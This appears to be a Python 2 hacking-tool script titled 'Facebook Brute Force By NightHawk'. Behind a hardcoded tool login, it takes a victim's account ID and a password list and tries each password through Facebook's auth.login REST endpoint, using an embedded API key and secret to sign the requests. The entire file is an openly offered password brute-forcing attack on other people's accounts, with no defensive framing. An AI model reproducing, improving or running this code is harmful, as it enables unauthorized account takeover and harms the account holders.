#!/usr/bin/python2

#coding=utf-8





import os

import sys

import urllib

import hashlib



os.system("clear")

print'''
  _   _ __   __  _    _ ______ _    _ _  ___          ___  __
 | \ | /_ | / / | |  | |____  | |  | | || \ \        / / |/ /
 |  \| || |/ /_ | |__| |   / /| |__| | || |\ \  /\  / /| ' / 
 | . ` || | '_ \|  __  |  / / |  __  |__   _\ \/  \/ / |  <  
 | |\  || | (_) | |  | | / /  | |  | |  | |  \  /\  /  | . \ 
 |_| \_||_|\___/|_|  |_|/_/   |_|  |_|  |_|   \/  \/   |_|\_|

	 '''


CorrectUsername = "N16H7H4WK"

CorrectPassword = "N16H7H4WK"



loop = 'true'

while (loop == 'true'):

    username = raw_input('\033[1;96m[+] \x1b[1;96mEnter tool username \x1b[1;91m: \x1b[1;92m')

    if (username == CorrectUsername):

    	password = raw_input('\033[1;96m[+] \x1b[1;96mEnter tool password \x1b[1;91m: \x1b[1;92m')

        if (password == CorrectPassword):

            print "Logged in successfully as " + username

            loop = 'false'

        else:

            print "Wrong Password"

            os.system('xdg-open https://www.youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')

    else:

        print "Wrong Username"

        os.system('xdg-open https://www.facebook.com/tanvirthenoobgamer')



os.system("clear")



print'''
  _   _ __   __  _    _ ______ _    _ _  ___          ___  __
 | \ | /_ | / / | |  | |____  | |  | | || \ \        / / |/ /
 |  \| || |/ /_ | |__| |   / /| |__| | || |\ \  /\  / /| ' / 
 | . ` || | '_ \|  __  |  / / |  __  |__   _\ \/  \/ / |  <  
 | |\  || | (_) | |  | | / /  | |  | |  | |  \  /\  /  | . \ 
 |_| \_||_|\___/|_|  |_|/_/   |_|  |_|  |_|   \/  \/   |_|\_|

	 '''



API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"



__banner__ = """
  _   _ __   __  _    _ ______ _    _ _  ___          ___  __
 | \ | /_ | / / | |  | |____  | |  | | || \ \        / / |/ /
 |  \| || |/ /_ | |__| |   / /| |__| | || |\ \  /\  / /| ' / 
 | . ` || | '_ \|  __  |  / / |  __  |__   _\ \/  \/ / |  <  
 | |\  || | (_) | |  | | / /  | |  | |  | |  \  /\  /  | . \ 
 |_| \_||_|\___/|_|  |_|/_/   |_|  |_|  |_|   \/  \/   |_|\_|

"""


print("[+] Facebook Brute Force By NightHawk\n")

userid = raw_input("[*] Enter ID : ")

try:

	passlist = raw_input("[*] Enter path of passlist: ")

	if os.path.exists(passlist) != False:
		
		os.system("clear")

		print(__banner__)

		print(" [+] Account to crack : {}".format(userid))

		print(" [+] Loaded : {}".format(len(open(passlist,"r").read().split("\n"))))

		print(" [+] Cracking, please wait ...")

		for passwd in open(passlist,'r').readlines():

			sys.stdout.write(u"\u001b[1000D[*] Trying {}".format(passwd.strip()))

			sys.stdout.flush()

			sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}".format(userid,passwd.strip(),API_SECRET)

			xx = hashlib.md5(sig).hexdigest()

			data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}".format(userid,passwd.strip(),xx)

			response = urllib.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read()

			if "error" in response:

				pass

			else:

				print("\n\n[+] Password found .. !!")

				print("\n[+] Password : {}".format(passwd.strip()))

				break

		print("\n\n[!] Done .. !!")

	else:

		print("fbbrute: error: No such file or directory")

except KeyboardInterrupt:

	print("fbbrute: error: Keyboard interrupt")
